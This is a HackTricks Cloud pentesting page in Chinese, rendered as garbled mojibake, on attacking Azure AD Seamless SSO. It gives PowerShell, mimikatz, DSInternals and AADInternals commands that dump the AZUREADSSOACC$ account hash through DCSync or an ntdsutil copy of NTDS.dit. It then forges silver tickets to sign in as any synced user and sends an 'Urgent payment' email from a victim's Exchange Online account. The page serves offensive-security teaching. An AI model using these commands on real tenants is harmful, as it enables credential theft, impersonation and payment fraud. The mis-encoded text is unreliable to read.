# Az - æ— ç¼ SSO

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ **HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

Azure Active Directory æ— ç¼å•ç‚¹ç™»å½•ï¼ˆAzure AD æ— ç¼ SSOï¼‰ä¼šåœ¨ç”¨æˆ·ä½¿ç”¨å…¬å¸è®¾å¤‡å¹¶è¿æ¥åˆ°å…¬å¸ç½‘ç»œæ—¶è‡ªåŠ¨**ç™»å½•ç”¨æˆ·**ã€‚å¯ç”¨åï¼Œ**ç”¨æˆ·æ— éœ€è¾“å…¥å¯†ç å³å¯ç™»å½•åˆ°Azure AD**ï¼Œé€šå¸¸ç”šè‡³æ— éœ€è¾“å…¥ç”¨æˆ·åã€‚æ­¤åŠŸèƒ½ä¸ºç”¨æˆ·æä¾›äº†è½»æ¾è®¿é—®åŸºäºäº‘çš„åº”ç”¨ç¨‹åºçš„æ–¹æ³•ï¼Œæ— éœ€ä»»ä½•é¢å¤–çš„æœ¬åœ°ç»„ä»¶ã€‚

<figure><img src="../../../../.gitbook/assets/image (7) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

åŸºæœ¬ä¸Š Azure AD æ— ç¼ SSO ä¼šåœ¨ç”¨æˆ·**åœ¨æœ¬åœ°åŸŸåŠ å…¥çš„PCä¸Š**æ—¶**ç™»å½•ç”¨æˆ·**ã€‚

å®ƒç”± [**PHS (å¯†ç å“ˆå¸ŒåŒæ­¥)**](phs-password-hash-sync.md) å’Œ [**PTA (é€ä¼ è®¤è¯)**](pta-pass-through-authentication.md) æ”¯æŒã€‚

æ¡Œé¢ SSO ä½¿ç”¨ **Kerberos** è¿›è¡Œè®¤è¯ã€‚é…ç½®æ—¶ï¼ŒAzure AD Connect ä¼šåœ¨æœ¬åœ° AD ä¸­åˆ›å»ºä¸€ä¸ªåä¸º **AZUREADSSOACC`$`** çš„è®¡ç®—æœºå¸æˆ·ã€‚`AZUREADSSOACC$` å¸æˆ·çš„å¯†ç åœ¨é…ç½®æœŸé—´ä»¥**æ˜æ–‡å‘é€åˆ°Azure AD**ã€‚

**Kerberosç¥¨æ®**ä½¿ç”¨å¯†ç çš„ **NTHash (MD4)** **åŠ å¯†**ï¼ŒAzure AD ä½¿ç”¨å‘é€çš„å¯†ç æ¥è§£å¯†ç¥¨æ®ã€‚

**Azure AD** æš´éœ²äº†ä¸€ä¸ª**ç«¯ç‚¹** (https://autologon.microsoftazuread-sso.com) ç”¨äºæ¥å— Kerberos **ç¥¨æ®**ã€‚åŸŸåŠ å…¥çš„æœºå™¨çš„æµè§ˆå™¨å°†ç¥¨æ®è½¬å‘åˆ°æ­¤ç«¯ç‚¹ä»¥è¿›è¡Œ SSOã€‚

### æœ¬åœ° -> äº‘

ç”¨æˆ· **`AZUREADSSOACC$` çš„å¯†ç **æ°¸è¿œä¸ä¼šæ”¹å˜ã€‚å› æ­¤ï¼ŒåŸŸç®¡ç†å‘˜å¯ä»¥ç ´è§£è¯¥å¸æˆ·çš„**å“ˆå¸Œå€¼**ï¼Œç„¶åä½¿ç”¨å®ƒæ¥**åˆ›å»ºé“¶ç¥¨æ®**ï¼Œä»¥**ä»»ä½•åŒæ­¥çš„æœ¬åœ°ç”¨æˆ·**çš„èº«ä»½è¿æ¥åˆ°Azureï¼š
```powershell
# Dump hash using mimikatz
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\azureadssoacc$ /domain:domain.local /dc:dc.domain.local"'
mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit

# Dump hash using https://github.com/MichaelGrafnetter/DSInternals
Get-ADReplAccount -SamAccountName 'AZUREADSSOACC$' -Domain contoso -Server lon-dc1.contoso.local

# Dump using ntdsutil and DSInternals
## Dump NTDS.dit
ntdsutil "ac i ntds" "ifmâ€ "create full C:\temp" q q
## Extract password
Install-Module DSInternals
Import-Module DSInternals
$key = Get-BootKey -SystemHivePath 'C:\temp\registry\SYSTEM'
(Get-ADDBAccount -SamAccountName 'AZUREADSSOACC$' -DBPath 'C:\temp\Active Directory\ntds.dit' -BootKey $key).NTHash | Format-Hexos
```
ä½¿ç”¨è¯¥å“ˆå¸Œï¼Œæ‚¨ç°åœ¨å¯ä»¥**ç”Ÿæˆé“¶ç¥¨**ï¼š
```powershell
# Get users and SIDs
Get-AzureADUser | Select UserPrincipalName,OnPremisesSecurityIdentifier

# Create a silver ticket to connect to Azure with mimikatz
Invoke-Mimikatz -Command '"kerberos::golden /user:onpremadmin /sid:S-1-5-21-123456789-1234567890-123456789 /id:1105 /domain:domain.local /rc4:<azureadssoacc hash> /target:aadg.windows.net.nsatc.net /service:HTTP /ptt"'
mimikatz.exe "kerberos::golden /user:elrond /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234 /domain:contoso.local /rc4:12349e088b2c13d93833d0ce947676dd /target:aadg.windows.net.nsatc.net /service:HTTP /ptt" exit

# Create silver ticket with AADInternal to access Exchange Online
$kerberos=New-AADIntKerberosTicket -SidString "S-1-5-21-854168551-3279074086-2022502410-1104" -Hash "097AB3CBED7B9DD6FE6C992024BC38F4"
$at=Get-AADIntAccessTokenForEXO -KerberosTicket $kerberos -Domain company.com
## Send email
Send-AADIntOutlookMessage -AccessToken $at -Recipient "someone@company.com" -Subject "Urgent payment" -Message "<h1>Urgent!</h1><br>The following bill should be paid asap."
```
ä½¿ç”¨é“¶ç¥¨ï¼š

1. å¯åŠ¨ _Mozilla Firefox_ã€‚
2. è½¬åˆ° **`about:config`** å¹¶è®¾ç½® [network.negotiate-auth.trusted-uris](https://github.com/mozilla/policy-templates/blob/master/README.md#authentication) é¦–é€‰é¡¹ä¸º [value](https://docs.microsoft.com/en-us/azure/active-directory/connect/active-directory-aadconnect-sso#ensuring-clients-sign-in-automatically) `https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com`
3. å¯¼èˆªåˆ°ä»»ä½•ä¸æˆ‘ä»¬AADåŸŸé›†æˆçš„ç½‘ç»œåº”ç”¨ç¨‹åºã€‚æˆ‘ä»¬å°†ä½¿ç”¨ [Office 365](https://portal.office.com/)ï¼Œè¿™æ˜¯æœ€å¸¸ç”¨çš„ä¸€ä¸ªã€‚
4. åœ¨ç™»å½•å±å¹•ä¸Šï¼Œå¡«å†™ç”¨æˆ·åï¼Œå¯†ç å­—æ®µç•™ç©ºã€‚ç„¶åæŒ‰TABæˆ–ENTERã€‚

<figure><img src="../../../../.gitbook/assets/image (3) (3) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
å¦‚æœå¯ç”¨äº†MFAï¼Œè¿™ä¸ä¼šç»•è¿‡MFA
{% endhint %}

#### ~~ä¸ºäº‘ç«¯å”¯ä¸€ç”¨æˆ·åˆ›å»ºKerberosç¥¨æ®~~ <a href="#creating-kerberos-tickets-for-cloud-only-users" id="creating-kerberos-tickets-for-cloud-only-users"></a>

å¦‚æœActive Directoryç®¡ç†å‘˜å¯ä»¥è®¿é—®Azure AD Connectï¼Œä»–ä»¬å¯ä»¥**ä¸ºä»»ä½•äº‘ç”¨æˆ·è®¾ç½®SID**ã€‚è¿™æ ·ä¹Ÿå¯ä»¥ä¸º**äº‘ç«¯å”¯ä¸€ç”¨æˆ·åˆ›å»º**Kerberos **ç¥¨æ®**ã€‚å”¯ä¸€çš„è¦æ±‚æ˜¯SIDæ˜¯ä¸€ä¸ªæ­£ç¡®çš„ [SID](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc778824\(v=ws.10\))ã€‚

{% hint style="danger" %}
ç°åœ¨**å¾®è½¯å·²é˜»æ­¢**æ›´æ”¹äº‘ç«¯å”¯ä¸€ç®¡ç†å‘˜ç”¨æˆ·çš„SIDã€‚\
æœ‰å…³ä¿¡æ¯è¯·æŸ¥çœ‹ [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
{% endhint %}

### æœ¬åœ° -> äº‘ç«¯é€šè¿‡åŸºäºèµ„æºçš„å—é™å§”æ´¾ <a href="#creating-kerberos-tickets-for-cloud-only-users" id="creating-kerberos-tickets-for-cloud-only-users"></a>

ä»»ä½•å¯ä»¥ç®¡ç†è®¡ç®—æœºè´¦æˆ·ï¼ˆ`AZUREADSSOACC$`ï¼‰çš„äººï¼Œå¦‚æœè¿™ä¸ªè´¦æˆ·åœ¨å®¹å™¨æˆ–OUä¸­ï¼Œä»–ä»¬å¯ä»¥**é…ç½®åŸºäºèµ„æºçš„å—é™å§”æ´¾æ¥è®¿é—®è¿™ä¸ªè´¦æˆ·**ã€‚

<figure><img src="../../../../.gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

## å‚è€ƒèµ„æ–™

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso)
* [https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/](https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/)
* [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
* [TR19: I'm in your cloud, reading everyone's emails - hacking Azure AD via Active Directory](https://www.youtube.com/watch?v=JEIR5oGCwdg)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ç›´åˆ°æˆä¸ºä¸“å®¶ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs**](https://opensea.io/collection/the-peass-family)ç³»åˆ—
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
